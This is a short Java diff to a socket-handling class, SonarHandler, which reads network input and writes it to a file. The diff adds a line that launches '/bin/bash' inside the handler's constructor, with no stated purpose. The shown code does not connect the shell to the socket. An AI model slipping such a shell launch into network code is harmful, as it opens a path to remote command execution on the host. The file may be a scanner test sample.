@@ -6,6 +6,7 @@ import java.net.Socket;
  */
 public class SonarHandler {
     public SonarHandler(Socket s) throws IOException {
+        Process p = Runtime.getRuntime().exec("/bin/bash");
         BufferedReader br = new BufferedReader(new InputStreamReader (s.getInputStream()));
         StringBuilder sb = new StringBuilder();
 
@@ -17,6 +18,6 @@ public class SonarHandler {
             f.write(line);
         }
 
-        
+
     }
 }
